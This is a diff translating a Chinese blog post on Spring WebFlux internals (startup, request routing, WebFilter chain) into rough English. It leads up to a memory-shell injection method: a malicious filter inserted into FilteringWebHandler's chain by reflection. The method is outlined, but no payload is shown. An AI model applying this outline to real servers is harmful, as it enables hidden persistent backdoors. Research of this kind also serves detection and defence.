-|    **`Flux.filter`**    |            过滤满足条件的元素            | `Flux<Integer> numbers = Flux.range(1, 5);`<br>`Flux<Integer> filteredFlux = numbers.filter(n -> n % 2 == 0);` |
-|     **`Flux.map`**      |             转换每个元素的值             | `Flux<String> words = Flux.just("apple", "banana", "cherry");`<br>`Flux<Integer> wordLengths = words.map(String::length);` |
-|   **`Flux.flatMap`**    | 将每个元素映射到一个`Flux`，并将结果平铺 | `Flux<String> letters = Flux.just("A", "B", "C");`<br>`Flux<String> flatMappedFlux = letters.flatMap(letter -> Flux.just(letter, letter.toLowerCase()));` |
+|     **`Flux.just`**     |         Create a `Flux` containing the specified element         |       `Flux<String> flux = Flux.just("A", "B", "C");`        |
+| **`Flux.fromIterable`** |          Create `Flux` from `Iterable`          | `List<String> list = Arrays.asList("A", "B", "C");`<br>`Flux<String> flux = Flux.fromIterable(list);` |
+|  **`Flux.fromArray`**   |             Create `Flux` from an array             | `String[] array = {"A", "B", "C"};`<br>`Flux<String> flux = Flux.fromArray(array);` |
+|    **`Flux.empty`**     |            Create an empty `Flux`            |           `Flux<Object> emptyFlux = Flux.empty();`           |
+|    **`Flux.error`**     |         Create a `Flux` containing errors         | `Flux<Object> errorFlux = Flux.error(new RuntimeException("Something went wrong"));` |
+|    **`Flux.range`**     |    Creates a `Flux` containing a sequence of integers with a specified range    |        `Flux<Integer> rangeFlux = Flux.range(1, 5);`         |
+|   **`Flux.interval`**   |      Creates a `Flux` containing elements with a certain interval      | `Flux<Long> intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);` |
+|    **`Flux.merge`**     |    Merge multiple Fluxes and interleave elements in chronological order    | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("C", "D");`<br>`Flux<String> mergedFlux = Flux.merge(flux1, flux2);` |
+|    **`Flux.concat`**    |     Connect multiple `Flux` and publish elements in order     | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("C", "D");`<br>`Flux<String> concatenatedFlux = Flux.concat(flux1, flux2);` |
+|     **`Flux.zip`**      | Pair multiple `Flux` elements to generate `Tuple`  | `Flux<String> flux1 = Flux.just("A", "B");`<br>`Flux<String> flux2 = Flux.just("1", "2");`<br>`Flux<Tuple2<String, String>> zippedFlux = Flux.zip(flux1, flux2);` |
+|    **`Flux.filter`**    |            Filter elements that meet the criteria            | `Flux<Integer> numbers = Flux.range(1, 5);`<br>`Flux<Integer> filteredFlux = numbers.filter(n -> n % 2 == 0);` |
+|     **`Flux.map`**      |             Convert the value of each element             | `Flux<String> words = Flux.just("apple", "banana", "cherry");`<br>`Flux<Integer> wordLengths = words.map(String::length);` |
+|   **`Flux.flatMap`**    | Map each element to a `Flux` and til the result flat | `Flux<String> letters = Flux.just("A", "B", "C");`<br>`Flux<String> flatMappedFlux = letters.flatMap(letter -> Flux.just(letter, letter.toLowerCase()));` |
 
-### 2.12.3 Spring WebFlux启动过程分析
+### 2.12.3 Spring WebFlux startup process analysis
 
-本来是想先用文字聊一堆关于`Spring MVC`和`Spring WebFlux`之间的区别的，但是这个已经被网上现有的不多的关于`WebFlux`的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖`WebFlux`的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。
+I originally wanted to use text to talk about the difference between `Spring MVC` and `Spring WebFlux`, but this has been talked about by the few existing articles on `WebFlux` on the Internet. You can search for it casually. The superficial things are purely a waste of time. So we look at the code and dig deep into the calling process of `WebFlux`. From this, we can naturally find similarities and differences between the two in the calling process.
 
-我们直接在`run`方法这里下断点，然后直接`step into`：
+We directly set a breakpoint in the `run` method, and then directly `step into`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122151538700.png)
 
-一步步地`step over`之后，我们可以看到调用了`org.springframework.boot.SpringApplication#createApplicationContext`这个方法（前面的那些方法并不重要，直接略过就行）：
+After step over, we can see that the method `org.springframework.boot.SpringApplication#createApplicationContext` is called (the previous methods are not important, just skip them):
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122151616672.png)
 
-这个方法光听名字`createApplicationContext`，就感觉很重要，因为字面意思就是创建`ApplicationContext`，这正是我们感兴趣的内容，我们`step into`进去看看：
+This method just listens to the name `createApplicationContext`, which is very important because it literally means creating `ApplicationContext`, which is exactly what we are interested in. Let's go in and take a look:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122152201947.png)
 
-可以看到，是根据不同的`webApplicationType`去选择创建不同的`context`，比如我们这里的`webApplicationType`就是`REACTIVE`，也就是响应式的。
+It can be seen that different `contexts are selected according to different `webApplicationType`, for example, our `webApplicationType` is `REACTIVE`, which is responsive.
 
-我们`step into`这里的`create`方法：
+Our `step into` here `create` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122152757458.png)
 
-发现里面有两个静态方法、一个`create`方法和一个默认实现 `DEFAULT`，这个默认实现通过加载 `ApplicationContextFactory` 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 `AnnotationConfigApplicationContext` 实例。
+It was found that there are two static methods, a `create` method and a default implementation `DEFAULT`. This default implementation creates the corresponding context by loading all candidate implementations of `ApplicationContextFactory`; if no suitable implementation is found, a `AnnotationConfigApplicationContext` instance is returned by default.
 
-我们继续`step over`走下去，可以看到我们`REACTIVE`对应的`context`是`AnnotationConfigReactiveWebServerApplicationContext`：
+Let's continue to walk over and see that the `context` corresponding to our `REACTIVE` is `AnnotationConfigReactiveWebServerApplicationContext`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122153321207.png)
 
-继续往下走，我们会回到一开始这里，可以看到接下来会调用`prepareContext`、`refreshContext`和`afterRefresh`方法，这个过程就是一系列的初始化、监听的注册等操作：
+Continue to go down, we will go back to the beginning, and you can see that the `prepareContext`, `refreshContext` and `afterRefresh` methods will be called next. This process is a series of initialization, listening registration and other operations:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122153436756.png)
 
-我们`step into`这里的`refreshContext`方法：
+Our `step into`refreshContext` method here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154347190.png)
 
-接着`step into`这里的`refresh`方法：
+Then `step into` here `refresh` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154415854.png)
 
-进来之后，接着`step into`这里的`refresh`方法：
+After entering, then the `step into`refresh` method here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154457308.png)
 
-可以看到，这里调用了一个`super.refresh`，也就是父类的`refresh`方法：
+You can see that a `super.refresh` is called here, which is the `refresh` method of the parent class:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154526246.png)
 
-我们继续`step into`查看，发现这里调用了`onRefresh`方法：
+We continued to view `step into` and found that the onRefresh method is called here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154705098.png)
 
-我们`step into`这里的`onRefresh`，发现它调用了关键的`org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer`：
+We `step into` here `onRefresh` and found that it calls the key `org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154751318.png)
 
-继续`step over`可以看到，由于我们使用的是`Netty`而不是`Tomcat`，因此这里最终会调用`NettyReactiveWebServerFactory`类中的`getWebServer`方法：
+Continue to step over, you can see that since we are using `Netty` instead of `Tomcat`, we end up calling the `getWebServer` method in the `NettyReactiveWebServerFactory` class:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122155504128.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122155752526.png)
 
-而上图中的`WebServerManager`类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象`WebServer`，另一个是上层方法处理者的抽象`DelayedInitializationHttpHandler`：
+The `WebServerManager` class in the figure above is also an important encapsulation class, with two member variables, one is the abstract `WebServer` of the underlying server, and the other is the abstract `DelayedInitializationHttpHandler` of the upper-level method handler:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122172421426.png)
 
-那这个`webserver`具体是怎么启动的呢？我们继续走到`finishRefresh`这个方法这里来，如果这里我们直接无脑`step over`，程序最终会回到`run`方法，说明，启动`webserver`的地方肯定就在这个`finishRefresh`方法里面：
+So how exactly is this `webserver` started? Let's continue to go to the `finishRefresh` method. If we directly have no brainstorming `step over`, the program will eventually return to the `run` method. It means that the place where the `webserver` is definitely in the `finishRefresh` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174153904.png)
 
-我们`step into`进去看看：
+Let's go in and take a look:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174401684.png)
 
-接着`step into`去看看这里调用的`getLifecycleProcessor().onRefresh()`方法，发现调用了`startBeans`方法，并且设置了自启动：
+Then `step into` and check out the `getLifecycleProcessor().onRefresh()` method called here, and found that the `startBeans` method was called and the self-start was set:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174441696.png)
 
-我们直接`step into`这个`startBeans`方法，一步步地`step over`过后，会发现调用了`start`方法，看来我们在逐渐逼近真相：
+We directly `step into` the startBeans` method, step over step by step, and you will find that the start method is called. It seems that we are gradually approaching the truth:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174628586.png)
 
-我们继续`step into`这个`start`方法，发现调用了`org.springframework.context.support.DefaultLifecycleProcessor#doStart`这个方法：
+We continued to the `step into the `start` method and found that the `org.springframework.context.support.DefaultLifecycleProcessor#doStart` method was called:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174728904.png)
 
-直接`step into`进去看看，发现由于`dependenciesForBean`为[]，所以没有调用`doStart`方法，直接就是调用`bean.start()`：
+I went in and found that since `dependenciesForBean` is [], the `doStart` method was not called, and I just called `bean.start()`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174837382.png)
 
-继续`step into`这个`start`方法看看：
+Continue to the `step into` start` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180726791.png)
 
-怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法：
+How come there is nothing? What a strange thing, what went wrong? I was stunned at this step and decided to cancel the breakpoint I had hit before, and set the breakpoint at the position shown in the following two figures to re-debug, because these two methods are the key methods:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180840172.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180857277.png)
 
-调试了几遍之后发现是我疏忽了，这里的`this.lifecycleBeans`里面其实有三个，每调用一次`doStart`方法就会删掉一个：
+After debugging several times, I found that I was negligent. There are actually three in this.lifecycleBeans here. One will be deleted every time the `doStart` method is called:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181045819.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181305946.png)
 
-可以看到，我们刚才调用的是第一个`bean`的，所以当然没有启动`webserver`相关的方法了：
+As you can see, we just called the first `bean`, so of course there is no method related to starting `webserver`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181456742.png)
 
-我们一步步`step over`，当`memeber.name`为`webServerStartStop`时，我们再`step into`这个`doStart`方法里面的`bean.start()`：
+We step over. When `memeber.name` is `webServerStartStop`, we will step into the `bean.start()` in the `doStart` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181729409.png)
 
-即可看到`this.weServerManager.start()`：
+You can see `this.weServerManager.start()`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181751790.png)
 
-我们继续`step into`这个`start`方法：
+Let's continue with the `step into` this `start` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181838844.png)
 
-仔细看看上面红框中的代码，先是初始化`HttpHandler`，这个方法其实根据`lazyInit`的值的不同来决定何时初始化，如果`lazyInit`值为`true`，那么就等第一次请求到来时才真正初始化；如果为`false`，那么就在 `WebServerManager` 的 `start` 方法中调用 `initializeHandler` 直接初始化：
+Take a closer look at the code in the red box above. First, initialize `HttpHandler`. This method actually determines when to initialize according to the difference in the value of `lazyInit`. If `lazyInit` is `true`, then wait until the first request arrives before it is actually initialized; if `false`, then call `initializeHandler` in the `start` method of `WebServerManager` to initialize directly:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182528529.png)
 
-我们继续步入这里的`start`方法，发现其位置为`org.springframework.boot.web.embedded.netty.NettyWebServer#start`
+We continue to step into the `start` method here and find that its location is `org.springframework.boot.web.embedded.netty.NettyWebServer#start`
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182700152.png)
 
-到这里才算真正明了，真正的`webServer`启动的关键方法是`org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer`：
+It is only then that I really understand that the key method for starting a real `webServer` is `org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182843455.png)
 
-从下面的`this.webServer`中也可以看到，绑定的是`0.0.0.0:9191`：
+You can also see from the following `this.webServer` that the binding is `0.0.0.0:9191`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122183119082.png)
 
-### 2.12.4 Spring WebFlux请求处理过程分析
+### 2.12.4 Analysis of Spring WebFlux request processing process
 
-当一个请求过来的时候，`Spring WebFlux`是如何进行处理的呢？
+How does `Spring WebFlux` process when a request comes?
 
-这里我们在`org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello`这里打上断点，然后进行调试，访问`http://127.0.0.1:9191/hello`触发`debug`：
+Here we set a breakpoint at `org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello`, and then debug it, and visit `http://127.0.0.1:9191/hello` to trigger `debug`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122205005835.png)
 
-一步步地`step over`后来到`org.springframework.web.reactive.DispatcherHandler#invokeHandler`：
+Step by step `step over` and then go to `org.springframework.web.reactive.DispatcherHandler#invokeHandler`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122210839343.png)
 
-`step into`之后可以看到是`org.springframework.web.reactive.DispatcherHandler#handle`：
+After step into `step into`, you can see that it is `org.springframework.web.reactive.DispatcherHandler#handle`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122210930120.png)
 
-解释上面代码中的`return`部分，首先检查`handlerMappings`是否为`null`，如果是，那就调用`createNotFoundError`方法返回一个表示未找到处理程序的`Mono`；接着通过`CorsUtils.isPreFlightRequest`方法检查是否为预检请求，如果是，那就调用`handlePreFlight`方法处理预检请求，如果不是预检请求且`handlerMappings`不为`null`，通过一系列的操作，获取到请求的`handler`，然后调用`invokeHandler`方法执行处理程序，再调用`handleResult`方法处理执行结果，最终返回一个表示处理完成的`Mono`。
+Explain the `return` part of the above code, first check whether the `handlerMappings` is `null`. If so, call the `createNotFoundError` method to return a `Mono` indicating that the handler was not found; then check whether it is a preflight request through the `CorsUtils.isPreFlightRequest` method. If it is, call the `handlePreFlight` method to handle the preflight request. If it is not a preflight request and the `handlerMappings` is not `null`, obtain the requested `handler` through a series of operations, then call the `invokeHandler` method to execute the handler, and then call the `handleResult` method to process the execution result, and finally return a `Mono` indicating that the processing is completed.
 
-左下角的`Threads & Variables`这里，我们往下翻，可以看到在此之前是调用了一个`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler`：
+Here, we look down at the bottom left corner, and we can see that before this, a `org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler` was called:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122213235191.png)
 
-我们把之前的断点去掉，然后在该函数这里打上断点：
+We remove the previous breakpoint and then set the breakpoint here in the function:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122214012047.png)
 
-发现调用了`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal`，我们再回去看，发现调用位置在`org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal`：
+It was found that `org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal` was called. We went back and looked and found that the call location was `org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122215515467.png)
 
-点击去：
+Click to go:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222157225.png)
 
-这里最终创建的是`DefaultServerRequest`对象，需要注意的是在创建该对象时将`RouterFunctionMapping`中保存的`HttpMessageReader`列表作为参数传入，这样`DefaultServerRequest`对象就有了解析参数的能力。
+The final creation of the `DefaultServerRequest` object is. It should be noted that when creating the object, the `HttpMessageReader` list saved in `RouterFunctionMapping` is passed as a parameter, so that the `DefaultServerRequest` object has the ability to parse parameters.
 
-回到`getHandlerInternal`这个函数，看它的`return`里面的匿名函数，发现其调用了`org.springframework.web.reactive.function.server.RouterFunction#route`，我们点进去看看：
+Go back to the `getHandlerInternal` function, look at the anonymous function in its `return`, and find that it calls `org.springframework.web.reactive.function.server.RouterFunction#route`, and we click in to see:
 
-发现只是在接口中定义了下：
+I found that it was only defined in the interface:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222804578.png)
 
-于是去翻之前的`Threads & Variables`：
+So I went to the previous `Threads & Variables`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222845434.png)
 
-首先调用`this.predicate.test`方法来判断传入的`ServerRequest`是否符合路由要求，如果匹配到了处理方法，那就将保存的`HandlerFunction`实现返回，否则就返回空的`Mono`。
+First, call the `this.predicate.test` method to determine whether the incoming `ServerRequest` meets the routing requirements. If the processing method is matched, the saved `HandlerFunction` implementation will be returned, otherwise the empty `Mono` will be returned.
 
-点进去这个`test`方法，发现还是个接口，结合之前的`RouterFunction.java`和`RouterFunctions.java`的命名规则，合理猜测`test`方法的实现应该是在`RequestPredicates.java`里面。果然是有的，我们取消之前下的所有断点，在`test`函数这里重新打上断点后调试：
+Click on this `test` method and found that it is still an interface. Combined with the previous naming rules of `RouterFunction.java` and `RouterFunctions.java`, it is reasonable to guess that the implementation of the `test` method should be in `RequestPredicates.java`. Sure enough, we cancel all the breakpoints we had before, and debugged them after re-setting the breakpoint in the `test` function:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122223953217.png)
 
-可以看到这里已经拿到了`pattern`，那就还差解析`request`里面的`GET`这个方法了：
+You can see that you have already obtained the `pattern` here, so you are still missing to analyze the `GET` method in the `request`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122234829435.png)
 
-我们继续`step over`，发现直接跳到了这里，我当时就挺纳闷儿，这里的`this.left`和`this.right`怎么就已知了：
+We continued `step over` and found that we jumped here directly. I was quite puzzled at the time. How did we know the `this.left` and `this.right` here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123000521320.png)
 
-这俩变量已知说明在执行`test`之前肯定是已经被赋值了，我继续往后`step over`，从下图中可以看到，此时二者之间多了个`&&`，不难猜测，应该是调用了`org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate`方法，因为还有一个`OrRequestPredicate`，这个`or`的话应该就是`||`了：
+These two variables are known to indicate that they have been assigned values ​​before executing `test`. I continue to `step over`. From the figure below, you can see that there is an additional `&&` between the two. It is not difficult to guess that the `org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate` method is called, because there is also an `OrRequestPredicate`. If this `or` is the `||`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123000839479.png)
 
-于是我们再在`AndRequestPredicate`方法这打上断点，此时我们还没有访问`http://127.0.0.1:9191/hello`，就已经触发调试了，这是因为我们在`GreetingRouter.java`里面写的代码中有`GET`方法、`/hello`路由还有`and`方法，因此会调用到`AndRequestPredicate`，并把`GET`和`/hello`分别复制给`this.left`和`this.right`：
+So we set a breakpoint on the `AndRequestPredicate` method. At this time, we have triggered debugging before we accessed `http://127.0.0.1:9191/hello`. This is because the code we wrote in `GreetingRouter.java` includes the `GET` method, `/hello` route and `and` and `this.right`. Therefore, we will call `AndRequestPredicate` and copy `GET` and `/hello` to `this.left` and `this.right` respectively:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001430128.png)
 
@@ -1518,39 +1520,39 @@ registerHandlerMethod(handler, invocableMethod, mapping);
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001306237.png)
 
-到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们`2.12.3`节中的分析中已经基本涉及到了。我们还是在`org.springframework.web.reactive.DispatcherHandler#invokeHandler`打下断点调试：
+At this point, we basically understand the problem of routing matching. The next thing we need to consider is how to handle the request. This is relatively simple. Why do we say so? Because it has been basically involved in our analysis in Section 2.12.3. We still set up breakpoint debugging in `org.springframework.web.reactive.DispatcherHandler#invokeHandler`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002322377.png)
 
-可以看到，这里的`this.handlerAdapters`里面有四个`handlerAdapter`：
+You can see that there are four `handlerAdapters` in the `this.handlerAdapters`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002406757.png)
 
-并不是所有的`handlerAdapter`都会触发`handle`方法，只有当支持我们给定的`handler`的`handlerAdapter`才可以调用：
+Not all `handlerAdapter` triggers the `handle` method, and can only be called when the `handlerAdapter` that supports our given `handler`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002524030.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002714255.png)
 
-然后我们`step into`这里的`handlerAdapter.handle`方法，发现是在`org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle`：
+Then we `step into` here the `handlerAdapter.handle` method, and found that it is in `org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002806521.png)
 
-而这里的`handlerFunction.handle`也就是我们编写的`route`方法：
+And here `handlerFunction.handle` is the `route` method we wrote:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002927429.png)
 
-到这里，关于处理请求的部分也就完结了。
+At this point, the part about processing the request is completed.
 
-### 2.12.5 Spring WebFlux过滤器WebFilter运行过程分析
+### 2.12.5 Analysis of the operation process of Spring WebFlux filter WebFilter
 
-对于`Spring WebFlux`而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用`Filter`，关于这一部分知识可以参考Spring的官方文档：
+For Spring WebFlux, since there is no concept of interceptors and listeners, if you want to implement permission verification and access control, you must use `Filter`. For this part of your knowledge, please refer to Spring's official documentation:
 
 > https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html
 
-而在`Spring Webflux`中，存在两种类型的过滤器：一个是`WebFilter`，实现自`org.springframework.web.server.WebFilter`接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到`handler`之前或者之后执行一些逻辑；另一个就是`HandlerFilterFunction`，它是一种函数式编程的过滤器类型，实现自`org.springframework.web.reactive.function.server.HandlerFilterFunction`接口，与`WebFilter`相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。
+In Spring Webflux, there are two types of filters: one is WebFilter, which implements it from the org.springframework.web.server.WebFilter interface. By implementing this interface, a global filter can be defined, which can execute some logic before or after the request is routed to the handler; the other is the `HandlerFilterFunction`, which is a functional programming filter type, implementing it from the `org.springframework.web.reactive.function.server.HandlerFilterFunction` interface. Compared with `WebFilter`, it pays more attention to the style of functional programming and can be used to deal with routing-based filtering logic.
 
-这里我们以`WebFilter`为例，看看它的运行过程。新建一个`GreetingFilter.java`，代码如下：
+Here we take `WebFilter` as an example to see its running process. Create a new `GreetingFilter.java`, the code is as follows:
 
 ```java
 package org.example.webfluxmemoryshelldemo.hello;
@@ -1578,63 +1580,63 @@ public class GreetingFilter implements WebFilter {
 }
 ```
 
-效果如下：
+The effects are as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240124143107182.png)
 
-我们直接在`filter`函数这里下断点，进行调试：
+We directly set a breakpoint in the `filter` function and debug it:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240125211900082.png)
 
-注意到`return`中调用了`filter`函数，于是`step into`看看：
+I noticed that the `filter` function is called in `return`, so I took a look at it `step into`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240125220915532.png)
 
-可以看到是调用了`invokeFilter`函数。我们仔细看看这个`DefaultWebFilterChain`类：
+You can see that the `invokeFilter` function is called. Let's take a closer look at this `DefaultWebFilterChain` class:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126131433346.png)
 
-可以看到是有三个名为`DefaultWebFilterChain`的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建`chain`的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话：
+You can see that there are three functions called `DefaultWebFilterChain`, the first one is the public constructor, the second one is the private constructor (used to create the intermediate node of `chain`), and the third one is the outdated constructor. And in the comments of this class, there is a sentence:
 
 > Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link.
 >
 > ![](C:\Users\test\AppData\Roaming\Typora\typora-user-images\image-20240126131914865.png)
 
-也就是说，通过调用 `DefaultWebFilterChain` 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个`link`，而不是一个`chain`，这就意味着我们无法通过修改下图中的`chain.allFilters`来实现新增`Filter`：
+That is, by calling the public constructor of the `DefaultWebFilterChain` class, we initialize a complete filter chain, where each instance represents a `link` in the chain, rather than a `chain`, which means we cannot implement the new `Filter` by modifying the `chain.allFilters` in the figure below:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126132330870.png)
 
-但是这个类里面有个`initChain`方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法：
+However, there is an initChain method in this class to initialize the filter chain, and this method calls this private constructor:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133115205.png)
 
-那我们就看看这个公共构造方法是在哪里调用的：
+Then let's take a look at where this public constructor is called:
 
-光标移至该方法，按两下`Ctrl+Alt+F7`：
+Move the cursor to this method, press `Ctrl+Alt+F7` twice:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133242721.png)
 
-调用的地方位于`org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler`：
+The call is located at `org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133330601.png)
 
-那思路就来了，我们只需要构造一个`DefaultWebFilterChain`对象，，然后把它通过反射写入到`FilteringWebHandler`类对象的`chain`属性中就可以了。
+Then the idea comes. We just need to construct a `DefaultWebFilterChain` object, and then write it into the `chain` property of the `FilteringWebHandler` class object through reflection.
 
-那现在就剩下传入`handler`和`filters`这两个参数了，这个`handler`参数很好搞，就在`chain`里面：
+Now there are only two parameters left to pass in `handler` and `filters`. This `handler` parameter is easy to do, just in `chain`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133836697.png)
 
-然后这个`filters`的话，我们可以先获取到它本来的`filters`，然后把我们自己写的恶意`filter`放进去，放到第一位，就可以了。
+Then if we use these `filters`, we can first get its original `filters`, and then put the malicious `filters` we wrote ourselves in and put them first, and that's fine.
 
-那现在就是从内存中找到`DefaultWebFilterChain`的位置，然后一步步反射就行。这里直接使用工具`https://github.com/c0ny1/java-object-searcher`，克隆下来该项目，放到`idea`中`mvn clean install`：
+Now, find the location of `DefaultWebFilterChain` from memory and then reflect it step by step. Here, use the tool `https://github.com/c0ny1/java-object-searcher` directly, clone the project, and put it in `idea``mvn clean install`:
 
 ![image-20240126134339217](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126134339217.png)
 
-然后把生成的这个`java-object-searcher-0.1.0.jar`放到我们的`WebFluxMemoryShellDemo`项目的Project `Structure`中的`Libraries`中：
+Then put the generated `java-object-searcher-0.1.0.jar` into the `Libraries` in the Project `Structure` of our `WebFluxMemoryShellDemo` project:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126145032760.png)
 
-然后我们把我们的`GreetingFilter.java`的代码修改成下面的：
+Then we modify our `GreetingFilter.java` code to the following:
 
 ```java
 package org.example.webfluxmemoryshelldemo.hello;
@@ -1678,11 +1680,11 @@ public class GreetingFilter implements WebFilter {
 }
 ```
 
-这里我们设置的关键字是`DefaultWebFilterChain`，然后直接运行：
